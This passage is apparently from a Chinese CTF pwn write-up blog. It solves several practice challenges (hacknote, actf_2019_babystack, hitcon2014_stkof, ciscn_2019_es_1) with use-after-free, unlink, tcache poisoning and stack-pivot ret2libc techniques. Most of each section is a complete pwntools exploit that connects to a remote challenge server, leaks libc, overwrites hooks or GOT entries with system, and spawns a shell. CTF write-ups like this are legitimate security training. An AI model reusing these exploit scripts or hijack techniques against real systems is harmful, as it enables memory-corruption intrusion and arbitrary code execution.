class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2 : &#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recvuntil(<span class="string">b&#x27;4 : &#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    top_addr = heap_leak + <span class="number">0x40</span></span><br><span class="line">    log.info(<span class="string">&#x27;top chunk addr: &#x27;</span> + <span class="built_in">hex</span>(top_addr))</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line">    </span><br><span class="line">    new((-<span class="number">0x200</span>), <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x140</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(<span class="number">0x6020c0</span> + <span class="number">0x38</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># idx 8 back</span></span><br><span class="line">    new(<span class="number">0x30</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># idx 9, the heap array</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/08/yaP3HvoLJiZgxuq.png" alt="image.png"></p>
<h2 id="0x047-pwnable-hacknote-Use-After-Free-heap-arrangement"><a href="#0x047-pwnable-hacknote-Use-After-Free-heap-arrangement" class="headerlink" title="0x047.pwnable_hacknote - Use After Free + heap arrangement"></a>0x047.pwnable_hacknote - Use After Free + heap arrangement</h2><blockquote>
<p>pwnable.tw上的原题</p>
</blockquote>
<p>惯例的<code>checksec</code>，只开了NX和canary</p>
<p><img src="https://i.loli.net/2021/02/27/pVnPETsdzxrbX8o.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是一道有着分配、释放、打印堆块功能的堆题</p>
<p><img src="https://i.loli.net/2021/02/27/boTLc5AS1pjPGlZ.png" alt="image.png"></p>
<p>其中分配堆块的函数如下：</p>
<p><img src="https://i.loli.net/2021/02/27/sreVaIyX8uMCLlh.png" alt="image.png"></p>
<p>不难看出每个note的结构应当如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_NOTE_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">void</span> (*ptr)(<span class="type">char</span>*);</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;note;</span><br></pre></td></tr></table></figure>

<p>漏洞点在于释放函数中，释放后未将指针置0，存在UAF漏洞</p>
<p><img src="https://i.loli.net/2021/02/27/NPbM7Ii5dxVGJoj.png" alt="image.png"></p>
<p>基本上就是套板子做题，堆风水一套带走</p>
<p>在这里有个踩坑的点就是其函数指针的调用方式，其读取的起始范围会包括前面的部分，故我们需要用<code>;sh\x00</code>进行填充</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x8</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;artt&#x27;</span>) <span class="comment"># idx 2, overlapping with idx 0</span></span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">    main_arena = u32(p.recv(<span class="number">4</span>)) - <span class="number">48</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x18</span></span><br><span class="line">    libc_base = __malloc_hook  - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x8</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;;sh\x00&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/6AafhE97z5XJlSo.png" alt="F_QAG__EVIR0_X8VZF30R_L.png"></p>
<h2 id="0x048-actf-2019-babystack-ret2libc-stack-migration"><a href="#0x048-actf-2019-babystack-ret2libc-stack-migration" class="headerlink" title="0x048.actf_2019_babystack - ret2libc + stack migration"></a>0x048.actf_2019_babystack - ret2libc + stack migration</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/06/UrikdPeSnIzv9AX.png" alt="image.png"><img src="https://i.loli.net/2021/04/06/UrikdPeSnIzv9AX.png" alt="image.png"></p>
<p>拖入IDA进行分析，有溢出，但是只有0x10字节，白给栈上地址，考虑栈迁移</p>
<p><img src="https://i.loli.net/2021/04/06/idnF9bLfq36jN1e.png" alt="image.png"></p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25625</span>)<span class="comment">#process(&#x27;./ACTF_2019_babystack&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line">offset = <span class="number">0xd0</span></span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your message will be saved at &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.send((<span class="string">b&#x27;arttnba3&#x27;</span> + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4008F6</span>)).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack_leak) + p64(leave_ret))</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your message will be saved at &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.send((<span class="string">b&#x27;arttnba3&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack_leak) + p64(leave_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/d9q3CKFTQkajZl2.png" alt="image.png"></p>
<h2 id="0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><a href="#0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget" class="headerlink" title="0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget"></a>0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</h2><p>惯例的 <code>checksec</code> ，保护全…只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/04/06/fhCpAXLSK7rTHVs.png" alt="image.png"></p>
<p>拖入IDA 进行分析</p>
<p>没有菜单提示的菜单题（恼）</p>
<p>大概是有分配、释放、编辑堆块功能</p>
<p><img src="https://i.loli.net/2021/04/06/uBYpC2mdAWy4ilF.png" alt="image.png"></p>
<p>漏洞在于编辑长度自定，存在堆溢出</p>
<p><img src="https://i.loli.net/2021/04/07/2tXSkUziY7hIL9y.png" alt="image.png"></p>
<p>没有打印功能，没有 tcache 也难整任意地址写（fastbin size检查），那就只能通过unlink劫持got表了（恼）</p>
<p>大概是构造如下堆布局（表格有点丑，将就着看（x）），因为存放堆指针的数组在bss段上，没开PIE，那我们直接用 unlink 劫持got表即可</p>
<table>
<thead>
<tr>
<th align="right">address</th>
<th align="right">prev_size</th>
<th align="right">size</th>
</tr>
</thead>
<tbody><tr>
<td align="right">chunk2</td>
<td align="right">0</td>
<td align="right">0x31</td>
</tr>
<tr>
<td align="right">(fake chunk)</td>
<td align="right">0</td>
<td align="right">0x21</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">&amp;chunk_array[2] - 0x18</td>
<td align="right">&amp;chunk_array[2] - 0x10</td>
</tr>
<tr>
<td align="right">chunk3</td>
<td align="right">0x20</td>
<td align="right">0x90</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">…</td>
<td align="right">…</td>
</tr>
</tbody></table>
<p>大概能够满足 <code>fake chunk-&gt;FD-&gt;BK = fake chunk</code> 和 <code>fake chunk-&gt;BK-&gt;FD = fake chunk</code> ，此时 free(chunk3)，由于 prev_in_use 位为 0，我们的 fake chunk 就会被合并到chunk3中</p>
<p>接下来的 unlink 操作会将<code>fake chunk-&gt;FD-&gt;BK</code> 赋值为<code>fake chunk-&gt;BK</code>，将<code>fake chunk-&gt;BK-&gt;FD</code> 赋值为<code>fake chunk-&gt;FD</code></p>
<p>即<strong>存放</strong> <code>chunk2</code> <strong>指针的位置存放的指针变成了</strong> <code>&amp;chunk_array[2] - 0x18</code> <strong>的地址</strong>，此时我们便可以直接修改 <code>chunk_array</code> 中指针，劫持 got 表一套带走</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27629</span>)<span class="comment">#process(&#x27;./stkof&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span> ,size:<span class="built_in">int</span> ,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x20</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 4</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/87TAZSdY15jgbIP.png" alt="image.png"></p>
<h2 id="0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning"><a href="#0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning" class="headerlink" title="0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning"></a>0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/07/ZaHXOWpYDhPAFJ7.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是有着分配、打印、释放堆块的功能</p>
<p>漏洞点在于释放时指针未置0，存在 UAF（<del>暗示996的公司永远不可能被真正消灭</del>（←🔫</p>
<p><img src="https://i.loli.net/2021/04/07/vk6zEGilmgOD9aw.png" alt="image.png"></p>
<p>libc 2.27，没有 double free检测，套板子一套带走（感觉现在大部分题目都是套板子a…）</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27368</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input compary call:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">0xf</span>) <span class="comment"># idx 5, hijack the tcache</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span 